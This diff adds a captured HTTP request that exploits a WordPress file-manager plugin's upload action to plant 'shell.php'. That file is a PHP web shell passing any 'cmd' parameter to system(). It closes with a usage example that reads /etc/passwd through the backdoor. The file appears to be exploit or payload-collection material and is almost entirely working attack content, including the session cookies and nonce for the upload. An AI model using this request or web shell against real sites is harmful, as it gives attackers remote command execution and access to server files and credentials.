@@ -1,0 +1,43 @@
+POST
+Host=10.0.0.67
+User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0
+Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language=it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding=gzip, deflate
+Referer=http://www.example.com/wp-admin/admin.php?page=file-manager/add-new-file
+Content-Length=775
+Content-Type=multipart/form-data; boundary=---------------------------298331869519772
+Cookie=wordpress_b43b255bc018ee66673cd91980a723bf=usernametest%7C1405260002%7C76c1b315f6f8b6e1885921a763036464; wp-settings-1=advImgDetails%3Dshow%26libraryContent%3Dupload%26wpfb_adv_uploader%3D1%26editor%3Dtinymce%26uploader%3D1; wp-settings-time-1=1405085177; bLicense54=true; testpopup=true; __utma=86855576.2039073811.1404413871.1404413871.1404416567.2; __utmz=86855576.1404413871.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); s_fid=6EEA54B2DFA4150F-06C135149F70F3D9; wp-settings-time-2=1404901595; wp-settings-2=mfold%3Do; cms-panel-collapsed-cms-content-tools-CMSPagesController=true; cms-panel-collapsed-cms-menu=false; cms-panel-collapsed-cms-content-tools-AssetAdmin=true; cms-panel-collapsed-cms-content-tools-CMSMain=false; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_b43b255bc018ee66673cd91980a723bf=usernametest%7C1405260002%7Cf8b04eec8327ab6f17d0b28ce02fe66e
+Connection=keep-alive
+Pragma=no-cache
+Cache-Control=no-cache
+POSTDATA =-----------------------------298331869519772
+Content-Disposition: form-data; name="name"
+
+shell.php
+-----------------------------298331869519772
+Content-Disposition: form-data; name="_ajax_nonce"
+
+1cfccd7168
+-----------------------------298331869519772
+Content-Disposition: form-data; name="action"
+
+file_upload
+-----------------------------298331869519772
+Content-Disposition: form-data; name="async-upload"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+Usage: http://www.example.com/simple-backdoor.php?cmd=cat+/etc/passwd
+
